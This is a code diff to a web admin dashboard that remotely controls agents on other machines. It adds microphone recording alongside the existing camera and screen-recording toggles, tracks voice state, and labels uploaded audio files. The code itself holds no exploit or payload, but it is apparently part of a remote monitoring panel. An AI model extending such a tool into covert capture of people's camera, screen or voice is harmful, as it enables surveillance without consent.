@@ -551,6 +551,7 @@
                 <div class="status-chip-row">
                     <div id="recording-chip" class="status-chip unknown">Recording: Unknown</div>
                     <div id="camera-chip" class="status-chip unknown">Camera: Unknown</div>
+                    <div id="voice-chip" class="status-chip unknown">Voice: Unknown</div>
                 </div>
                 <div id="control-feedback" class="control-feedback"></div>
             </div>
@@ -563,6 +564,10 @@
                 <div class="action-grid">
                     <button id="btn-start-cam" class="btn-cam" onclick="sendControl('admin_start_camera')">Camera On</button>
                     <button id="btn-stop-cam" class="btn-stop" onclick="sendControl('admin_stop_camera')">Camera Off</button>
+                </div>
+                <div class="action-grid">
+                    <button id="btn-start-voice" class="btn-cam" onclick="sendControl('admin_start_voice')">Voice On</button>
+                    <button id="btn-stop-voice" class="btn-stop" onclick="sendControl('admin_stop_voice')">Voice Off</button>
                 </div>
                 <hr class="divider">
                 <div class="action-grid">
@@ -656,12 +661,15 @@
         const cameraShell = document.getElementById('camera-shell');
         const recordingChip = document.getElementById('recording-chip');
         const cameraChip = document.getElementById('camera-chip');
+        const voiceChip = document.getElementById('voice-chip');
         const controlFeedbackEl = document.getElementById('control-feedback');
         const previewFeedbackEl = document.getElementById('preview-feedback');
         const startRecBtn = document.getElementById('btn-start-rec');
         const stopRecBtn = document.getElementById('btn-stop-rec');
         const startCamBtn = document.getElementById('btn-start-cam');
         const stopCamBtn = document.getElementById('btn-stop-cam');
+        const startVoiceBtn = document.getElementById('btn-start-voice');
+        const stopVoiceBtn = document.getElementById('btn-stop-voice');
         const localRecordStartBtn = document.getElementById('btn-local-rec-start');
         const localRecordStopBtn = document.getElementById('btn-local-rec-stop');
         const snapshotBtn = document.getElementById('btn-snapshot');
@@ -1032,17 +1040,21 @@
             const canControl = hasDevice && online;
             const isRecording = Boolean(state?.recording);
             const isCameraOn = Boolean(state?.cameraOn);
+            const isVoiceRecording = Boolean(state?.voiceRecording);
 
             startRecBtn.disabled = !canControl || isRecording;
             stopRecBtn.disabled = !canControl || !isRecording;
             startCamBtn.disabled = !canControl || isCameraOn;
             stopCamBtn.disabled = !canControl || !isCameraOn;
+            startVoiceBtn.disabled = !canControl || isVoiceRecording;
+            stopVoiceBtn.disabled = !canControl || !isVoiceRecording;
         }
 
         function updateRuntimeStateUI() {
             if (!selectedAgentId) {
                 setChipState(recordingChip, 'Recording', null);
                 setChipState(cameraChip, 'Camera', null);
+                setChipState(voiceChip, 'Voice', null);
                 updateControlButtons(null, false);
                 return;
             }
@@ -1052,6 +1064,7 @@
 
             setChipState(recordingChip, 'Recording', isOnline ? state?.recording : null);
             setChipState(cameraChip, 'Camera', isOnline ? state?.cameraOn : null);
+            setChipState(voiceChip, 'Voice', isOnline ? state?.voiceRecording : null);
             updateControlButtons(state, isOnline);
         }
 
@@ -1585,6 +1598,10 @@
                     return 'Camera on';
                 case 'stop_camera':
                     return 'Camera off';
+                case 'start_voice_capture':
+                    return 'Voice recording on';
+                case 'stop_voice_capture':
+                    return 'Voice recording off';
                 default:
                     return 'Command';
             }
@@ -1623,6 +1640,7 @@
                 agentRuntimeState[agent.id] = {
                     recording: Boolean(agent.recording),
                     cameraOn: Boolean(agent.cameraOn),
+                    voiceRecording: Boolean(agent.voiceRecording),
                     online: true,
                     updatedAt: Date.now()
                 };
@@ -1691,6 +1709,7 @@
             agentRuntimeState[data.agentId] = {
                 recording: Boolean(data.recording),
                 cameraOn: Boolean(data.cameraOn),
+                voiceRecording: Boolean(data.voiceRecording),
                 online: data.online !== false,
                 updatedAt: Date.now()
             };
@@ -1703,6 +1722,7 @@
                 updateRuntimeStateUI();
                 const recordingText = data.recording ? 'Recording ON' : 'Recording OFF';
                 const cameraText = data.cameraOn ? 'Camera ON' : 'Camera OFF';
+                const voiceText = data.voiceRecording ? 'Voice ON' : 'Voice OFF';
                 const feedbackType = data.online === false ? 'warn' : 'ok';
                 setControlFeedback(`${recordingText} • ${cameraText}`, feedbackType);
             }
@@ -1756,7 +1776,8 @@
             link.href = data.url;
             link.target = '_blank';
             link.rel = 'noopener noreferrer';
-            link.innerText = `Video from ${data.machine} - ${new Date().toLocaleTimeString()}`;
+            const mediaLabel = data.mediaType === 'audio' ? 'Audio' : 'Video';
+            link.innerText = `${mediaLabel} from ${data.machine} - ${new Date().toLocaleTimeString()}`;
             videoList.prepend(link);
             updateVideoEmptyState();
         });
